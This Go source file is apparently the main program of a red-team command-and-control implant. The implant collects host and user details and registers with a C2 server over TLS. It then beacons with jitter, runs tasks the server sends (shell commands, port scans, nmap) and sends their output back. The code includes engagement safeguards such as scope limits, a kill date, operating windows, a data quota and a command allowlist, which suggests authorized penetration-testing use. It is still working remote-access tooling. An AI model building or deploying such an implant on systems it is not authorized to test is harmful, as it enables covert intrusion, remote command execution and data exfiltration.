package main

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/azizbinmohammad/private-c2/implant/safety"
	"github.com/azizbinmohammad/private-c2/implant/task"
	"github.com/azizbinmohammad/private-c2/pkg/engagement"
	"github.com/azizbinmohammad/private-c2/pkg/envelope"
	"github.com/azizbinmohammad/private-c2/pkg/protocol"
	"github.com/azizbinmohammad/private-c2/pkg/tlsutil"
)

var (
	agentSafety    *safety.SafetyChecker
	agentAllowlist *safety.CommandAllowlist

	errKillSwitch = errors.New("kill switch activated")
)

func sendMessage(conn net.Conn, msg *protocol.Message) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("marshal message: %w", err)
	}
	return envelope.WriteFrame(conn, data)
}

func readMessage(conn net.Conn) (*protocol.Message, error) {
	data, err := envelope.ReadFrame(conn)
	if err != nil {
		return nil, err
	}
	var msg protocol.Message
	if err := json.Unmarshal(data, &msg); err != nil {
		return nil, fmt.Errorf("unmarshal message: %w", err)
	}
	return &msg, nil
}

func generateImplantID() string {
	const charset = "abcdef0123456789"
	b := make([]byte, 16)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func collectSystemInfo() protocol.RegisterData {
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	return protocol.RegisterData{
		ImplantID: generateImplantID(),
		Hostname:  hostname,
		Username:  username,
		OS:        runtime.GOOS,
		Arch:      runtime.GOARCH,
		PID:       os.Getpid(),
		Process:   filepath.Base(os.Args[0]),
		Mode:      "beacon",
	}
}

func sleepWithJitter(interval time.Duration, jitter float64) {
	if jitter <= 0 {
		time.Sleep(interval)
		return
	}
	delta := time.Duration(float64(interval) * jitter)
	actual := interval - delta + time.Duration(rand.Int63n(int64(2*delta)+1))
	if actual < 0 {
		actual = 0
	}
	time.Sleep(actual)
}

func connect(serverAddr string, tlsConfig *tls.Config) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	conn, err := tls.DialWithDialer(dialer, "tcp", serverAddr, tlsConfig)
	if err != nil {
		return nil, fmt.Errorf("tls dial: %w", err)
	}
	return conn, nil
}

func register(conn net.Conn, info protocol.RegisterData) (string, error) {
	regData, err := json.Marshal(info)
	if err != nil {
		return "", err
	}
	msg := &protocol.Message{Type: "register", Data: regData}
	if err := sendMessage(conn, msg); err != nil {
		return "", fmt.Errorf("send register: %w", err)
	}

	ack, err := readMessage(conn)
	if err != nil {
		return "", fmt.Errorf("read register_ack: %w", err)
	}
	if ack.Type != "register_ack" {
		return "", fmt.Errorf("expected register_ack, got %s", ack.Type)
	}

	var ackData protocol.RegisterAckData
	if err := json.Unmarshal(ack.Data, &ackData); err != nil {
		return "", fmt.Errorf("unmarshal register_ack: %w", err)
	}

	return ackData.SessionID, nil
}

func main() {
	serverAddr := flag.String("server", "", "C2 server address (host:port)")
	interval := flag.Duration("interval", 5*time.Second, "beacon interval")
	jitter := flag.Float64("jitter", 0.3, "jitter factor (0-1)")
	caPath := flag.String("ca", "", "path to CA cert PEM used to verify the server (required unless --insecure)")
	certPath := flag.String("cert", "", "path to client certificate PEM presented to the server (required when the listener enforces mTLS)")
	keyPath := flag.String("key", "", "path to client private key PEM")
	insecure := flag.Bool("insecure", false, "skip server certificate verification (development only)")

	engagementID := flag.String("engagement-id", "", "engagement identifier used by safety checks")
	scopeCIDRs := flag.String("scope-cidrs", "", "comma-separated CIDR ranges allowed by the engagement")
	scopeHosts := flag.String("scope-hosts", "", "comma-separated hostnames allowed by the engagement")
	scopeDomains := flag.String("scope-domains", "", "comma-separated domain suffixes allowed by the engagement")
	killDateRaw := flag.String("kill-date", "", "RFC3339 time after which the implant must stop")
	windowStart := flag.String("window-start", "", "RFC3339 start of the allowed operating window")
	windowEnd := flag.String("window-end", "", "RFC3339 end of the allowed operating window")
	dataQuotaBytes := flag.Int64("data-quota-bytes", 0, "maximum bytes the implant may exfiltrate (0 = unlimited)")
	remoteKillURL := flag.String("remote-kill-url", "", "URL polled for a remote kill signal (fail-closed when unreachable)")
	safeMode := flag.Bool("safe-mode", false, "enforce the read-only command allowlist")
	flag.Parse()

	var err error
	agentSafety, agentAllowlist, err = buildSafety(safetyConfig{
		EngagementID:  *engagementID,
		CIDRs:         *scopeCIDRs,
		Hosts:         *scopeHosts,
		Domains:       *scopeDomains,
		KillDate:      *killDateRaw,
		WindowStart:   *windowStart,
		WindowEnd:     *windowEnd,
		DataQuota:     *dataQuotaBytes,
		RemoteKillURL: *remoteKillURL,
		SafeMode:      *safeMode,
	})
	if err != nil {
		log.Fatalf("safety configuration: %v", err)
	}

	if *serverAddr == "" {
		fmt.Fprintf(os.Stderr, "error: --server is required\n")
		os.Exit(1)
	}

	tlsConfig, err := tlsutil.ClientTLSConfig(tlsutil.ClientOptions{
		CAPath:   *caPath,
		CertFile: *certPath,
		KeyFile:  *keyPath,
		Insecure: *insecure,
	})
	if err != nil {
		log.Fatalf("tls config: %v", err)
	}

	sysInfo := collectSystemInfo()

	// Signal handling for graceful shutdown.
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	backoff := time.Second
	const maxBackoff = 60 * time.Second

	for {
		if ctx.Err() != nil {
			return
		}

		conn, err := connect(*serverAddr, tlsConfig)
		if err != nil {
			log.Printf("connect failed: %v (retry in %v)", err, backoff)
			select {
			case <-time.After(backoff):
			case <-ctx.Done():
				return
			}
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
			continue
		}
		backoff = time.Second // reset on successful connect

		sessionID, err := register(conn, sysInfo)
		if err != nil {
			log.Printf("register failed: %v", err)
			conn.Close()
			continue
		}

		log.Printf("registered, session_id=%s", sessionID)

		err = beaconLoop(ctx, conn, sessionID, *interval, *jitter)
		conn.Close()

		if ctx.Err() != nil {
			return
		}
		if errors.Is(err, errKillSwitch) {
			log.Printf("terminating: %v", err)
			return
		}
		if err != nil {
			log.Printf("beacon loop error: %v (reconnecting in %v)", err, backoff)
			select {
			case <-time.After(backoff):
			case <-ctx.Done():
				return
			}
			backoff *= 2
			if backoff > maxBackoff {
				backoff = maxBackoff
			}
		}
	}
}

type safetyConfig struct {
	EngagementID  string
	CIDRs         string
	Hosts         string
	Domains       string
	KillDate      string
	WindowStart   string
	WindowEnd     string
	DataQuota     int64
	RemoteKillURL string
	SafeMode      bool
}

// buildSafety constructs the implant-side safety checker from flags. An empty
// configuration yields a checker that passes, preserving development flow;
// configured constraints fail closed.
func buildSafety(cfg safetyConfig) (*safety.SafetyChecker, *safety.CommandAllowlist, error) {
	var scope *engagement.Scope
	cidrs, hosts, domains := splitList(cfg.CIDRs), splitList(cfg.Hosts), splitList(cfg.Domains)
	if len(cidrs) > 0 || len(hosts) > 0 || len(domains) > 0 {
		s, err := engagement.NewScope(cidrs, hosts, domains, nil)
		if err != nil {
			return nil, nil, err
		}
		scope = s
	}

	var killDate time.Time
	if cfg.KillDate != "" {
		t, err := time.Parse(time.RFC3339, cfg.KillDate)
		if err != nil {
			return nil, nil, fmt.Errorf("kill date: %w", err)
		}
		killDate = t
	}

	var window *engagement.TimeWindow
	if cfg.WindowStart != "" || cfg.WindowEnd != "" {
		if cfg.WindowStart == "" || cfg.WindowEnd == "" {
			return nil, nil, fmt.Errorf("both window-start and window-end are required")
		}
		start, err := time.Parse(time.RFC3339, cfg.WindowStart)
		if err != nil {
			return nil, nil, fmt.Errorf("window start: %w", err)
		}
		end, err := time.Parse(time.RFC3339, cfg.WindowEnd)
		if err != nil {
			return nil, nil, fmt.Errorf("window end: %w", err)
		}
		window = &engagement.TimeWindow{Start: start, End: end}
	}

	var quota *engagement.DataQuota
	if cfg.DataQuota > 0 {
		quota = engagement.NewDataQuota(cfg.DataQuota)
	}

	killSwitch := engagement.NewKillSwitch()
	checker := safety.NewSafetyChecker(safety.SafetyConfig{
		KillSwitch:    killSwitch,
		EngagementID:  cfg.EngagementID,
		KillDate:      killDate,
		TimeWindow:    window,
		Scope:         scope,
		DataQuota:     quota,
		RemoteKillURL: cfg.RemoteKillURL,
	})

	var allowlist *safety.CommandAllowlist
	if cfg.SafeMode {
		allowlist = safety.NewCommandAllowlist()
		allowlist.Enable()
	}
	return checker, allowlist, nil
}

func splitList(raw string) []string {
	if strings.TrimSpace(raw) == "" {
		return nil
	}
	parts := strings.Split(raw, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		if v := strings.TrimSpace(p); v != "" {
			out = append(out, v)
		}
	}
	return out
}

// taskTarget extracts the network target a task will act on, when it has one.
func taskTarget(t protocol.TaskWire) string {
	switch t.Type {
	case protocol.TaskPortscan:
		target, _, err := parsePortscanArgs(t.Args)
		if err == nil {
			return target
		}
	case protocol.TaskResolve:
		return strings.TrimSpace(t.Args)
	case protocol.TaskScan:
		var req struct {
			Target string `json:"target"`
		}
		if err := json.Unmarshal([]byte(t.Args), &req); err == nil {
			return strings.TrimSpace(req.Target)
		}
	case protocol.TaskNmap:
		fields := strings.Fields(t.Args)
		for i := len(fields) - 1; i >= 0; i-- {
			if !strings.HasPrefix(fields[i], "-") {
				return fields[i]
			}
		}
	}
	return ""
}

func checkTaskSafety(ctx context.Context, t protocol.TaskWire) error {
	if agentAllowlist != nil && agentAllowlist.IsEnabled() && t.Type == protocol.TaskShell {
		if ok, reason := agentAllowlist.IsAllowed(t.Args); !ok {
			return fmt.Errorf("refused by command allowlist: %s", reason)
		}
	}
	if agentSafety == nil {
		return nil
	}
	result := agentSafety.CheckWithTarget(ctx, taskTarget(t))
	if !result.Passed {
		return fmt.Errorf("refused by safety policy: %s", result.Reason)
	}
	return nil
}

func beaconLoop(ctx context.Context, conn net.Conn, sessionID string, interval time.Duration, jitter float64) error {
	// Tasks run on background workers so a long scan or shell command does not
	// stop the implant from checking in. Results are flushed at the start of
	// each cycle.
	runner := task.NewRunner(func(ctx context.Context, t protocol.TaskWire) (string, error) {
		return handleTask(ctx, t)
	}, task.RunnerConfig{SafetyCheck: checkTaskSafety})
	defer runner.Close()

	for {
		if agentSafety != nil {
			check := agentSafety.Check(ctx)
			if !check.Passed {
				log.Printf("safety check failed: %s", check.Reason)
				if check.Fatal {
					return errKillSwitch
				}
			}
		}

		if err := flushResults(conn, sessionID, runner); err != nil {
			return err
		}

		sleepWithJitter(interval, jitter)

		if ctx.Err() != nil {
			return nil
		}

		// Send checkin.
		checkinData, _ := json.Marshal(protocol.CheckinData{SessionID: sessionID})
		if err := sendMessage(conn, &protocol.Message{Type: "checkin", Data: checkinData}); err != nil {
			return fmt.Errorf("send checkin: %w", err)
		}

		// Read tasking.
		taskingMsg, err := readMessage(conn)
		if err != nil {
			if err == io.EOF {
				return fmt.Errorf("server closed connection")
			}
			return fmt.Errorf("read tasking: %w", err)
		}
		if taskingMsg.Type != "tasking" {
			log.Printf("unexpected message type: %s", taskingMsg.Type)
			continue
		}

		var tasking protocol.TaskingData
		if err := json.Unmarshal(taskingMsg.Data, &tasking); err != nil {
			log.Printf("unmarshal tasking: %v", err)
			continue
		}
		if tasking.Kill {
			log.Printf("server ordered kill: %s", tasking.KillReason)
			return nil
		}

		for _, t := range tasking.Tasks {
			if !runner.Submit(t) {
				log.Printf("duplicate or invalid task ignored: %s", t.ID)
			}
		}
	}
}

// flushResults sends every completed task result and waits for its ack.
func flushResults(conn net.Conn, sessionID string, runner *task.Runner) error {
	for _, res := range runner.Drain() {
		result := protocol.ResultData{
			SessionID: sessionID,
			TaskID:    res.TaskID,
			Success:   res.Success,
			Output:    res.Output,
			Error:     res.Error,
			Truncated: res.Truncated,
			Bytes:     res.Bytes,
		}
		resultJSON, _ := json.Marshal(result)
		if err := sendMessage(conn, &protocol.Message{Type: "result", Data: resultJSON}); err != nil {
			return fmt.Errorf("send result: %w", err)
		}
		ack, err := readMessage(conn)
		if err != nil {
			return fmt.Errorf("read result_ack: %w", err)
		}
		if ack.Type != "result_ack" {
			log.Printf("expected result_ack, got %s", ack.Type)
		}
	}
	return nil
}
